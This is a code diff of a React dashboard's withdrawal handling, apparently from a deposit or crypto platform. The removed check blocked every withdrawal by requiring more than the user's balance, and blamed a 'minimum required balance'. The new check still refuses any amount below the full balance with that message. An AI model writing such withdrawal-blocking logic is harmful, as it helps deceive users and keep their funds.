@@ -841,7 +841,7 @@ export default function Dashboard() {
                 {/* ✅ Confirm Button */}
                 <button
                   onClick={async () => {
-                    if (Number(withdrawAmount) < balance + 815) {
+                    if (Number(withdrawAmount) < balance) {
                       setWithdrawMessage(
                         `You have not reached the minimum required balance to make a
                         withdrawal. Current balance: $${balance}`,
@@ -889,7 +889,7 @@ export default function Dashboard() {
 
                     // ✅ Keep popup message intact
                     setWithdrawMessage(
-                      `Withdrawal Pending! Will take up to 24 hours or more depending on the status of recipient\nMethod: ${
+                      `Withdrawal Pending! May take up to 24 hours or more depending on the status of recipient\nMethod: ${
                         withdrawType === "wallet"
                           ? selectedWallet
                           : selectedBank === "custom"
